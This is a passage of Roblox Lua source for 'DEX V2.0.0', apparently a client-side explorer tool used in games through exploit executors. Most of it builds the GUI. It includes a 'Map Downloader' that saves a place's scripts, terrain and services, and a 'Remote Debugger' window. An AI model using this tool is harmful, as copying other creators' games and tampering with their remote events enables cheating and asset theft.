		NewGuiPart99.Size = UDim2.new(0, 80, 0, 20)
		NewGuiPart99.Font = Enum.Font.SourceSans
		NewGuiPart99.FontSize = Enum.FontSize.Size14
		NewGuiPart99.Text = "To Clipboard"

		NewGuiPart100.Name = "ScriptBar"
		NewGuiPart100.Parent = NewGuiPart86
		NewGuiPart100.BackgroundColor3 = Color3.new(0.823529, 0.823529, 0.823529)
		NewGuiPart100.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart100.ClipsDescendants = true
		NewGuiPart100.Position = UDim2.new(0, 0, 0, 40)
		NewGuiPart100.Size = UDim2.new(1, -32, 0, 20)

		NewGuiPart101.Name = "Entry"
		NewGuiPart101.Parent = NewGuiPart86
		NewGuiPart101.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart101.BackgroundTransparency = 1
		NewGuiPart101.Size = UDim2.new(0, 100, 1, 0)
		NewGuiPart101.Visible = false

		NewGuiPart102.Name = "Button"
		NewGuiPart102.Parent = NewGuiPart101
		NewGuiPart102.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart102.BackgroundTransparency = 0.60000002384186
		NewGuiPart102.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart102.ClipsDescendants = true
		NewGuiPart102.Size = UDim2.new(1, 0, 1, 0)
		NewGuiPart102.ZIndex = 4
		NewGuiPart102.Font = Enum.Font.SourceSans
		NewGuiPart102.FontSize = Enum.FontSize.Size12
		NewGuiPart102.Text = ""
		NewGuiPart102.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart103.Name = "Close"
		NewGuiPart103.Parent = NewGuiPart101
		NewGuiPart103.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart103.BackgroundTransparency = 1
		NewGuiPart103.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart103.Position = UDim2.new(1, -20, 0, 0)
		NewGuiPart103.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart103.ZIndex = 4
		NewGuiPart103.Font = Enum.Font.SourceSans
		NewGuiPart103.FontSize = Enum.FontSize.Size14
		NewGuiPart103.Text = "X"

		NewGuiPart104.Name = "Close"
		NewGuiPart104.Parent = NewGuiPart82
		NewGuiPart104.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart104.BackgroundTransparency = 1
		NewGuiPart104.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart104.Position = UDim2.new(1, -20, 0, 0)
		NewGuiPart104.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart104.ZIndex = 5
		NewGuiPart104.Font = Enum.Font.SourceSans
		NewGuiPart104.FontSize = Enum.FontSize.Size14
		NewGuiPart104.Text = "X"

		NewGuiPart105.Name = "IntroFrame"
		NewGuiPart105.Parent = NewGuiPart1
		NewGuiPart105.BackgroundColor3 = Color3.new(0.960784, 0.960784, 0.960784)
		NewGuiPart105.BorderSizePixel = 0
		NewGuiPart105.Position = UDim2.new(1, 30, 0, 0)
		NewGuiPart105.Size = UDim2.new(0, 300, 1, 0)
		NewGuiPart105.ZIndex = 2

		NewGuiPart106.Name = "Main"
		NewGuiPart106.Parent = NewGuiPart105
		NewGuiPart106.BackgroundColor3 = Color3.new(0.960784, 0.960784, 0.960784)
		NewGuiPart106.BorderSizePixel = 0
		NewGuiPart106.Position = UDim2.new(0, -30, 0, 0)
		NewGuiPart106.Size = UDim2.new(0, 30, 0, 90)
		NewGuiPart106.ZIndex = 2

		NewGuiPart107.Name = "Title"
		NewGuiPart107.Parent = NewGuiPart105
		NewGuiPart107.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart107.BackgroundTransparency = 1
		NewGuiPart107.Position = UDim2.new(0, 100, 0, 150)
		NewGuiPart107.Size = UDim2.new(0, 100, 0, 60)
		NewGuiPart107.ZIndex = 2
		NewGuiPart107.Font = Enum.Font.SourceSansBold
		NewGuiPart107.FontSize = Enum.FontSize.Size60
		NewGuiPart107.Text = "DEX"
		NewGuiPart107.TextWrapped = true

		NewGuiPart108.Name = "Version"
		NewGuiPart108.Parent = NewGuiPart105
		NewGuiPart108.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart108.BackgroundTransparency = 1
		NewGuiPart108.Position = UDim2.new(0, 100, 0, 210)
		NewGuiPart108.Size = UDim2.new(0, 100, 0, 30)
		NewGuiPart108.ZIndex = 2
		NewGuiPart108.Font = Enum.Font.SourceSansBold
		NewGuiPart108.FontSize = Enum.FontSize.Size28
		NewGuiPart108.Text = "V2.0.0"
		NewGuiPart108.TextWrapped = true

		NewGuiPart109.Name = "Creator"
		NewGuiPart109.Parent = NewGuiPart105
		NewGuiPart109.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart109.BackgroundTransparency = 1
		NewGuiPart109.Position = UDim2.new(0, 80, 0, 300)
		NewGuiPart109.Size = UDim2.new(0, 140, 0, 30)
		NewGuiPart109.ZIndex = 2
		NewGuiPart109.Font = Enum.Font.SourceSansBold
		NewGuiPart109.FontSize = Enum.FontSize.Size28
		NewGuiPart109.Text = "Raspberry Pi , Script Made By Advancedev"
		NewGuiPart109.TextWrapped = true

		NewGuiPart110.Name = "Slant"
		NewGuiPart110.Parent = NewGuiPart105
		NewGuiPart110.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart110.BackgroundTransparency = 1
		NewGuiPart110.Position = UDim2.new(0, -30, 0, 90)
		NewGuiPart110.Rotation = 180
		NewGuiPart110.Size = UDim2.new(0, 30, 0, 30)
		NewGuiPart110.ZIndex = 2
		NewGuiPart110.Image = "rbxassetid://474172996"
		NewGuiPart110.ImageColor3 = Color3.new(0.960784, 0.960784, 0.960784)

		NewGuiPart111.Name = "SaveMapWindow"
		NewGuiPart111.Parent = NewGuiPart1
		NewGuiPart111.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart111.BackgroundTransparency = 0.10000000149012
		NewGuiPart111.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart111.Position = UDim2.new(1, 0, 0, 0)
		NewGuiPart111.Size = UDim2.new(0, 300, 1, 0)

		NewGuiPart112.Name = "Header"
		NewGuiPart112.Parent = NewGuiPart111
		NewGuiPart112.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart112.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart112.Size = UDim2.new(1, 0, 0, 17)

		NewGuiPart113.Parent = NewGuiPart112
		NewGuiPart113.BackgroundTransparency = 1
		NewGuiPart113.Position = UDim2.new(0, 4, 0, 0)
		NewGuiPart113.Size = UDim2.new(1, -4, 1, 0)
		NewGuiPart113.Font = Enum.Font.SourceSans
		NewGuiPart113.FontSize = Enum.FontSize.Size14
		NewGuiPart113.Text = "Map Downloader"
		NewGuiPart113.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart113.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart114.Name = "MapSettings"
		NewGuiPart114.Parent = NewGuiPart111
		NewGuiPart114.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart114.BackgroundTransparency = 1
		NewGuiPart114.Position = UDim2.new(0, 0, 0, 200)
		NewGuiPart114.Size = UDim2.new(1, 0, 0, 240)

		NewGuiPart115.Name = "Terrain"
		NewGuiPart115.Parent = NewGuiPart114
		NewGuiPart115.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart115.BackgroundTransparency = 1
		NewGuiPart115.Position = UDim2.new(0, 0, 0, 60)
		NewGuiPart115.Size = UDim2.new(1, 0, 0, 60)

		NewGuiPart116.Name = "SName"
		NewGuiPart116.Parent = NewGuiPart115
		NewGuiPart116.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart116.BackgroundTransparency = 1
		NewGuiPart116.Position = UDim2.new(0, 10, 0, 0)
		NewGuiPart116.Size = UDim2.new(1, -20, 0, 30)
		NewGuiPart116.Font = Enum.Font.SourceSans
		NewGuiPart116.FontSize = Enum.FontSize.Size18
		NewGuiPart116.Text = "Save Terrain"
		NewGuiPart116.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart117.Name = "Status"
		NewGuiPart117.Parent = NewGuiPart115
		NewGuiPart117.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart117.BackgroundTransparency = 1
		NewGuiPart117.Position = UDim2.new(0, 60, 0, 30)
		NewGuiPart117.Size = UDim2.new(0, 50, 0, 15)
		NewGuiPart117.Font = Enum.Font.SourceSans
		NewGuiPart117.FontSize = Enum.FontSize.Size18
		NewGuiPart117.Text = "Off"
		NewGuiPart117.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart118.Name = "Change"
		NewGuiPart118.Parent = NewGuiPart115
		NewGuiPart118.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
		NewGuiPart118.BorderSizePixel = 0
		NewGuiPart118.Position = UDim2.new(0, 10, 0, 30)
		NewGuiPart118.Size = UDim2.new(0, 40, 0, 15)
		NewGuiPart118.Font = Enum.Font.SourceSans
		NewGuiPart118.FontSize = Enum.FontSize.Size14
		NewGuiPart118.Text = ""

		NewGuiPart119.Name = "OnBar"
		NewGuiPart119.Parent = NewGuiPart118
		NewGuiPart119.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
		NewGuiPart119.BorderSizePixel = 0
		NewGuiPart119.Size = UDim2.new(0, 0, 0, 15)
		NewGuiPart119.Font = Enum.Font.SourceSans
		NewGuiPart119.FontSize = Enum.FontSize.Size14
		NewGuiPart119.Text = ""

		NewGuiPart120.Name = "Bar"
		NewGuiPart120.Parent = NewGuiPart118
		NewGuiPart120.BackgroundColor3 = Color3.new(0, 0, 0)
		NewGuiPart120.BorderSizePixel = 0
		NewGuiPart120.ClipsDescendants = true
		NewGuiPart120.Position = UDim2.new(0, -2, 0, -2)
		NewGuiPart120.Size = UDim2.new(0, 10, 0, 19)
		NewGuiPart120.Font = Enum.Font.SourceSans
		NewGuiPart120.FontSize = Enum.FontSize.Size14
		NewGuiPart120.Text = ""

		NewGuiPart121.Name = "Lighting"
		NewGuiPart121.Parent = NewGuiPart114
		NewGuiPart121.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart121.BackgroundTransparency = 1
		NewGuiPart121.Position = UDim2.new(0, 0, 0, 120)
		NewGuiPart121.Size = UDim2.new(1, 0, 0, 60)

		NewGuiPart122.Name = "SName"
		NewGuiPart122.Parent = NewGuiPart121
		NewGuiPart122.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart122.BackgroundTransparency = 1
		NewGuiPart122.Position = UDim2.new(0, 10, 0, 0)
		NewGuiPart122.Size = UDim2.new(1, -20, 0, 30)
		NewGuiPart122.Font = Enum.Font.SourceSans
		NewGuiPart122.FontSize = Enum.FontSize.Size18
		NewGuiPart122.Text = "Lighting Properties"
		NewGuiPart122.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart123.Name = "Status"
		NewGuiPart123.Parent = NewGuiPart121
		NewGuiPart123.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart123.BackgroundTransparency = 1
		NewGuiPart123.Position = UDim2.new(0, 60, 0, 30)
		NewGuiPart123.Size = UDim2.new(0, 50, 0, 15)
		NewGuiPart123.Font = Enum.Font.SourceSans
		NewGuiPart123.FontSize = Enum.FontSize.Size18
		NewGuiPart123.Text = "Off"
		NewGuiPart123.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart124.Name = "Change"
		NewGuiPart124.Parent = NewGuiPart121
		NewGuiPart124.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
		NewGuiPart124.BorderSizePixel = 0
		NewGuiPart124.Position = UDim2.new(0, 10, 0, 30)
		NewGuiPart124.Size = UDim2.new(0, 40, 0, 15)
		NewGuiPart124.Font = Enum.Font.SourceSans
		NewGuiPart124.FontSize = Enum.FontSize.Size14
		NewGuiPart124.Text = ""

		NewGuiPart125.Name = "OnBar"
		NewGuiPart125.Parent = NewGuiPart124
		NewGuiPart125.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
		NewGuiPart125.BorderSizePixel = 0
		NewGuiPart125.Size = UDim2.new(0, 0, 0, 15)
		NewGuiPart125.Font = Enum.Font.SourceSans
		NewGuiPart125.FontSize = Enum.FontSize.Size14
		NewGuiPart125.Text = ""

		NewGuiPart126.Name = "Bar"
		NewGuiPart126.Parent = NewGuiPart124
		NewGuiPart126.BackgroundColor3 = Color3.new(0, 0, 0)
		NewGuiPart126.BorderSizePixel = 0
		NewGuiPart126.ClipsDescendants = true
		NewGuiPart126.Position = UDim2.new(0, -2, 0, -2)
		NewGuiPart126.Size = UDim2.new(0, 10, 0, 19)
		NewGuiPart126.Font = Enum.Font.SourceSans
		NewGuiPart126.FontSize = Enum.FontSize.Size14
		NewGuiPart126.Text = ""

		NewGuiPart127.Name = "CameraInstances"
		NewGuiPart127.Parent = NewGuiPart114
		NewGuiPart127.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart127.BackgroundTransparency = 1
		NewGuiPart127.Position = UDim2.new(0, 0, 0, 180)
		NewGuiPart127.Size = UDim2.new(1, 0, 0, 60)

		NewGuiPart128.Name = "SName"
		NewGuiPart128.Parent = NewGuiPart127
		NewGuiPart128.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart128.BackgroundTransparency = 1
		NewGuiPart128.Position = UDim2.new(0, 10, 0, 0)
		NewGuiPart128.Size = UDim2.new(1, -20, 0, 30)
		NewGuiPart128.Font = Enum.Font.SourceSans
		NewGuiPart128.FontSize = Enum.FontSize.Size18
		NewGuiPart128.Text = "Camera Instances"
		NewGuiPart128.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart129.Name = "Status"
		NewGuiPart129.Parent = NewGuiPart127
		NewGuiPart129.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart129.BackgroundTransparency = 1
		NewGuiPart129.Position = UDim2.new(0, 60, 0, 30)
		NewGuiPart129.Size = UDim2.new(0, 50, 0, 15)
		NewGuiPart129.Font = Enum.Font.SourceSans
		NewGuiPart129.FontSize = Enum.FontSize.Size18
		NewGuiPart129.Text = "Off"
		NewGuiPart129.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart130.Name = "Change"
		NewGuiPart130.Parent = NewGuiPart127
		NewGuiPart130.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
		NewGuiPart130.BorderSizePixel = 0
		NewGuiPart130.Position = UDim2.new(0, 10, 0, 30)
		NewGuiPart130.Size = UDim2.new(0, 40, 0, 15)
		NewGuiPart130.Font = Enum.Font.SourceSans
		NewGuiPart130.FontSize = Enum.FontSize.Size14
		NewGuiPart130.Text = ""

		NewGuiPart131.Name = "OnBar"
		NewGuiPart131.Parent = NewGuiPart130
		NewGuiPart131.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
		NewGuiPart131.BorderSizePixel = 0
		NewGuiPart131.Size = UDim2.new(0, 0, 0, 15)
		NewGuiPart131.Font = Enum.Font.SourceSans
		NewGuiPart131.FontSize = Enum.FontSize.Size14
		NewGuiPart131.Text = ""

		NewGuiPart132.Name = "Bar"
		NewGuiPart132.Parent = NewGuiPart130
		NewGuiPart132.BackgroundColor3 = Color3.new(0, 0, 0)
		NewGuiPart132.BorderSizePixel = 0
		NewGuiPart132.ClipsDescendants = true
		NewGuiPart132.Position = UDim2.new(0, -2, 0, -2)
		NewGuiPart132.Size = UDim2.new(0, 10, 0, 19)
		NewGuiPart132.Font = Enum.Font.SourceSans
		NewGuiPart132.FontSize = Enum.FontSize.Size14
		NewGuiPart132.Text = ""

		NewGuiPart133.Name = "Scripts"
		NewGuiPart133.Parent = NewGuiPart114
		NewGuiPart133.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart133.BackgroundTransparency = 1
		NewGuiPart133.Size = UDim2.new(1, 0, 0, 60)

		NewGuiPart134.Name = "SName"
		NewGuiPart134.Parent = NewGuiPart133
		NewGuiPart134.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart134.BackgroundTransparency = 1
		NewGuiPart134.Position = UDim2.new(0, 10, 0, 0)
		NewGuiPart134.Size = UDim2.new(1, -20, 0, 30)
		NewGuiPart134.Font = Enum.Font.SourceSans
		NewGuiPart134.FontSize = Enum.FontSize.Size18
		NewGuiPart134.Text = "Save Scripts"
		NewGuiPart134.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart135.Name = "Status"
		NewGuiPart135.Parent = NewGuiPart133
		NewGuiPart135.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart135.BackgroundTransparency = 1
		NewGuiPart135.Position = UDim2.new(0, 60, 0, 30)
		NewGuiPart135.Size = UDim2.new(0, 50, 0, 15)
		NewGuiPart135.Font = Enum.Font.SourceSans
		NewGuiPart135.FontSize = Enum.FontSize.Size18
		NewGuiPart135.Text = "Off"
		NewGuiPart135.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart136.Name = "Change"
		NewGuiPart136.Parent = NewGuiPart133
		NewGuiPart136.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
		NewGuiPart136.BorderSizePixel = 0
		NewGuiPart136.Position = UDim2.new(0, 10, 0, 30)
		NewGuiPart136.Size = UDim2.new(0, 40, 0, 15)
		NewGuiPart136.Font = Enum.Font.SourceSans
		NewGuiPart136.FontSize = Enum.FontSize.Size14
		NewGuiPart136.Text = ""

		NewGuiPart137.Name = "OnBar"
		NewGuiPart137.Parent = NewGuiPart136
		NewGuiPart137.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
		NewGuiPart137.BorderSizePixel = 0
		NewGuiPart137.Size = UDim2.new(0, 0, 0, 15)
		NewGuiPart137.Font = Enum.Font.SourceSans
		NewGuiPart137.FontSize = Enum.FontSize.Size14
		NewGuiPart137.Text = ""

		NewGuiPart138.Name = "Bar"
		NewGuiPart138.Parent = NewGuiPart136
		NewGuiPart138.BackgroundColor3 = Color3.new(0, 0, 0)
		NewGuiPart138.BorderSizePixel = 0
		NewGuiPart138.ClipsDescendants = true
		NewGuiPart138.Position = UDim2.new(0, -2, 0, -2)
		NewGuiPart138.Size = UDim2.new(0, 10, 0, 19)
		NewGuiPart138.Font = Enum.Font.SourceSans
		NewGuiPart138.FontSize = Enum.FontSize.Size14
		NewGuiPart138.Text = ""

		NewGuiPart139.Name = "ToSave"
		NewGuiPart139.Parent = NewGuiPart111
		NewGuiPart139.BackgroundTransparency = 1
		NewGuiPart139.Position = UDim2.new(0, 0, 0, 17)
		NewGuiPart139.Size = UDim2.new(1, 0, 0, 20)
		NewGuiPart139.Font = Enum.Font.SourceSans
		NewGuiPart139.FontSize = Enum.FontSize.Size18
		NewGuiPart139.Text = "To Save"
		NewGuiPart139.TextColor3 = Color3.new(0, 0, 0)

		NewGuiPart140.Name = "CopyList"
		NewGuiPart140.Parent = NewGuiPart111
		NewGuiPart140.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart140.BackgroundTransparency = 0.80000001192093
		NewGuiPart140.Position = UDim2.new(0, 0, 0, 37)
		NewGuiPart140.Size = UDim2.new(1, 0, 0, 163)

		NewGuiPart141.Name = "Bottom"
		NewGuiPart141.Parent = NewGuiPart111
		NewGuiPart141.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart141.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart141.Position = UDim2.new(0, 0, 1, -50)
		NewGuiPart141.Size = UDim2.new(1, 0, 0, 50)

		NewGuiPart142.Parent = NewGuiPart141
		NewGuiPart142.BackgroundTransparency = 1
		NewGuiPart142.Position = UDim2.new(0, 4, 0, 0)
		NewGuiPart142.Size = UDim2.new(1, -4, 1, 0)
		NewGuiPart142.Font = Enum.Font.SourceSans
		NewGuiPart142.FontSize = Enum.FontSize.Size14
		NewGuiPart142.Text = "After the map saves, open a new place on studio, then right click Lighting and \"Insert from file...\", then select your file and run the unpacker script inside the folder."
		NewGuiPart142.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart142.TextWrapped = true
		NewGuiPart142.TextXAlignment = Enum.TextXAlignment.Left
		NewGuiPart142.TextYAlignment = Enum.TextYAlignment.Top

		NewGuiPart143.Name = "Save"
		NewGuiPart143.Parent = NewGuiPart111
		NewGuiPart143.BackgroundColor3 = Color3.new(0.941177, 0.941177, 0.941177)
		NewGuiPart143.BackgroundTransparency = 0.80000001192093
		NewGuiPart143.BorderColor3 = Color3.new(0, 0, 0)
		NewGuiPart143.Position = UDim2.new(0, 0, 1, -80)
		NewGuiPart143.Size = UDim2.new(1, 0, 0, 30)
		NewGuiPart143.Font = Enum.Font.SourceSans
		NewGuiPart143.FontSize = Enum.FontSize.Size18
		NewGuiPart143.Text = "Save"

		NewGuiPart144.Name = "FileName"
		NewGuiPart144.Parent = NewGuiPart111
		NewGuiPart144.BackgroundColor3 = Color3.new(0.941177, 0.941177, 0.941177)
		NewGuiPart144.BackgroundTransparency = 0.60000002384186
		NewGuiPart144.Position = UDim2.new(0, 0, 1, -105)
		NewGuiPart144.Size = UDim2.new(1, 0, 0, 25)
		NewGuiPart144.Font = Enum.Font.SourceSans
		NewGuiPart144.FontSize = Enum.FontSize.Size18
		NewGuiPart144.Text = "PlaceName"
		NewGuiPart144.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart145.Name = "Entry"
		NewGuiPart145.Parent = NewGuiPart111
		NewGuiPart145.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart145.BackgroundTransparency = 1
		NewGuiPart145.Size = UDim2.new(1, 0, 0, 22)
		NewGuiPart145.Visible = false

		NewGuiPart146.Name = "Change"
		NewGuiPart146.Parent = NewGuiPart145
		NewGuiPart146.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart146.BackgroundTransparency = 0.60000002384186
		NewGuiPart146.Position = UDim2.new(0, 10, 0, 1)
		NewGuiPart146.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart146.ZIndex = 2
		NewGuiPart146.Font = Enum.Font.SourceSans
		NewGuiPart146.FontSize = Enum.FontSize.Size18
		NewGuiPart146.Text = ""
		NewGuiPart146.TextColor3 = Color3.new(1, 1, 1)

		NewGuiPart147.Name = "enabled"
		NewGuiPart147.Parent = NewGuiPart146
		NewGuiPart147.BackgroundColor3 = Color3.new(0.380392, 0.380392, 0.380392)
		NewGuiPart147.BackgroundTransparency = 0.40000000596046
		NewGuiPart147.BorderSizePixel = 0
		NewGuiPart147.Position = UDim2.new(0, 3, 0, 3)
		NewGuiPart147.Size = UDim2.new(0, 14, 0, 14)
		NewGuiPart147.Font = Enum.Font.SourceSans
		NewGuiPart147.FontSize = Enum.FontSize.Size14
		NewGuiPart147.Text = ""

		NewGuiPart148.Name = "Info"
		NewGuiPart148.Parent = NewGuiPart145
		NewGuiPart148.BackgroundTransparency = 1
		NewGuiPart148.Position = UDim2.new(0, 40, 0, 0)
		NewGuiPart148.Size = UDim2.new(1, -40, 0, 22)
		NewGuiPart148.Font = Enum.Font.SourceSans
		NewGuiPart148.FontSize = Enum.FontSize.Size18
		NewGuiPart148.Text = "Workspace"
		NewGuiPart148.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart148.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart149.Name = "RemoteDebugWindow"
		NewGuiPart149.Parent = NewGuiPart1
		NewGuiPart149.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart149.BackgroundTransparency = 0.10000000149012
		NewGuiPart149.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart149.Position = UDim2.new(1, 0, 0, 0)
		NewGuiPart149.Size = UDim2.new(0, 300, 1, 0)

		NewGuiPart161.Name = "GetSetting"
		NewGuiPart161.Parent = NewGuiPart149
		NewGuiPart161.Archivable = true

		NewGuiPart150.Name = "Header"
		NewGuiPart150.Parent = NewGuiPart149
		NewGuiPart150.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart150.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart150.Size = UDim2.new(1, 0, 0, 17)

		NewGuiPart151.Parent = NewGuiPart150
		NewGuiPart151.BackgroundTransparency = 1
		NewGuiPart151.Position = UDim2.new(0, 4, 0, 0)
		NewGuiPart151.Size = UDim2.new(1, -4, 1, 0)
		NewGuiPart151.Font = Enum.Font.SourceSans
		NewGuiPart151.FontSize = Enum.FontSize.Size14
		NewGuiPart151.Text = "Remote Debugger"
		NewGuiPart151.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart151.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart152.Name = "Desc"
		NewGuiPart152.Parent = NewGuiPart149
		NewGuiPart152.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart152.BackgroundTransparency = 1
		NewGuiPart152.Position = UDim2.new(0, 0, 0, 20)
		NewGuiPart152.Size = UDim2.new(1, 0, 0, 40)
		NewGuiPart152.Font = Enum.Font.SourceSans
		NewGuiPart152.FontSize = Enum.FontSize.Size32
		NewGuiPart152.Text = "Have fun with remotes"
		NewGuiPart152.TextWrapped = true
		return NewGuiPart1
	end
	local D_E_X = CreateGui()
	D_E_X.Parent = game.Players.LocalPlayer.PlayerGui
	spawn(function()
		local Gui = D_E_X


		local IntroFrame = Gui:WaitForChild("IntroFrame")

		local SideMenu = Gui:WaitForChild("SideMenu")
		local OpenToggleButton = Gui:WaitForChild("Toggle")
		local CloseToggleButton = SideMenu:WaitForChild("Toggle")
		local OpenScriptEditorButton = SideMenu:WaitForChild("OpenScriptEditor")

		local ScriptEditor = Gui:WaitForChild("ScriptEditor")

		local SlideOut = SideMenu:WaitForChild("SlideOut")
		local SlideFrame = SlideOut:WaitForChild("SlideFrame")
		local Slant = SideMenu:WaitForChild("Slant")

		local ExplorerButton = SlideFrame:WaitForChild("Explorer")
		local SettingsButton = SlideFrame:WaitForChild("Settings")

		local SelectionBox = Instance.new("SelectionBox")
		SelectionBox.Parent = Gui

		local ExplorerPanel = Gui:WaitForChild("ExplorerPanel")
		local PropertiesFrame = Gui:WaitForChild("PropertiesFrame")
		local SaveMapWindow = Gui:WaitForChild("SaveMapWindow")
		local RemoteDebugWindow = Gui:WaitForChild("RemoteDebugWindow")

		local SettingsPanel = Gui:WaitForChild("SettingsPanel")
		local SettingsListener = SettingsPanel:WaitForChild("GetSetting")
		local SettingTemplate = SettingsPanel:WaitForChild("SettingTemplate")
		local SettingList = SettingsPanel:WaitForChild("SettingList")

		local SaveMapCopyList = SaveMapWindow:WaitForChild("CopyList")
		local SaveMapSettingFrame = SaveMapWindow:WaitForChild("MapSettings")
		local SaveMapName = SaveMapWindow:WaitForChild("FileName")
		local SaveMapButton = SaveMapWindow:WaitForChild("Save")
		local SaveMapCopyTemplate = SaveMapWindow:WaitForChild("Entry")
		local SaveMapSettings = {
			CopyWhat = {
				Workspace = true,
				Lighting = true,
				ReplicatedStorage = true,
				ReplicatedFirst = true,
				StarterPack = true,
				StarterGui = true,
				StarterPlayer = true
			},
			SaveScripts = true,
			SaveTerrain = true,
			LightingProperties = true,
			CameraInstances = true
		}

		local SelectionChanged = ExplorerPanel:WaitForChild("SelectionChanged")
		local GetSelection = ExplorerPanel:WaitForChild("GetSelection")
		local SetSelection = ExplorerPanel:WaitForChild("SetSelection")

		local Player = game:GetService("Players").LocalPlayer
		local Mouse = Player:GetMouse()

		local CurrentWindow = "Nothing c:"
		local Windows = {
			Explorer = {
				ExplorerPanel,
				PropertiesFrame
			},
			Settings = {SettingsPanel},
			SaveMap = {SaveMapWindow},
			Remotes = {RemoteDebugWindow}
		}

		function switchWindows(wName,over)
			if CurrentWindow == wName and not over then return end

			local count = 0

			for i,v in pairs(Windows) do
				count = 0
				if i ~= wName then
					for _,c in pairs(v) do c:TweenPosition(UDim2.new(1, 30, count * 0.5, count * 36), "Out", "Quad", 0.5, true) count = count + 1 end
				end
			end

			count = 0

			if Windows[wName] then
				for _,c in pairs(Windows[wName]) do c:TweenPosition(UDim2.new(1, -300, count * 0.5, count * 36), "Out", "Quad", 0.5, true) count = count + 1 end
			end

			if wName ~= "Nothing c:" then
				CurrentWindow = wName
				for i,v in pairs(SlideFrame:GetChildren()) do
					v.BackgroundTransparency = 1
					v.Icon.ImageColor3 = Color3.new(70/255, 70/255, 70/255)
				end
				if SlideFrame:FindFirstChild(wName) then
					SlideFrame[wName].BackgroundTransparency = 0.5
					SlideFrame[wName].Icon.ImageColor3 = Color3.new(0,0,0)
				end
			end
		end

		function toggleDex(on)
			if on then
				SideMenu:TweenPosition(UDim2.new(1, -330, 0, 0), "Out", "Quad", 0.5, true)
				OpenToggleButton:TweenPosition(UDim2.new(1,0,0,0), "Out", "Quad", 0.5, true)
				switchWindows(CurrentWindow,true)
			else
				SideMenu:TweenPosition(UDim2.new(1, 0, 0, 0), "Out", "Quad", 0.5, true)
				OpenToggleButton:TweenPosition(UDim2.new(1,-30,0,0), "Out", "Quad", 0.5, true)
				switchWindows("Nothing c:")
			end
		end

		local Settings = {
			ClickSelect = false,
			SelBox = false,
			ClearProps = false,
			SelectUngrouped = true,
			SaveInstanceScripts = true
		}

		function ReturnSetting(set)
			if set == "ClearProps" then
				return Settings.ClearProps
			elseif set == "SelectUngrouped" then
				return Settings.SelectUngrouped
			end
		end

		OpenToggleButton.MouseButton1Up:connect(function()
			toggleDex(true)
		end)

		OpenScriptEditorButton.MouseButton1Up:connect(function()
			if OpenScriptEditorButton.Active then
				ScriptEditor.Visible = true
			end
		end)

		CloseToggleButton.MouseButton1Up:connect(function()
			if CloseToggleButton.Active then
				toggleDex(false)
			end
		end)

		for i,v in pairs(SlideFrame:GetChildren()) do
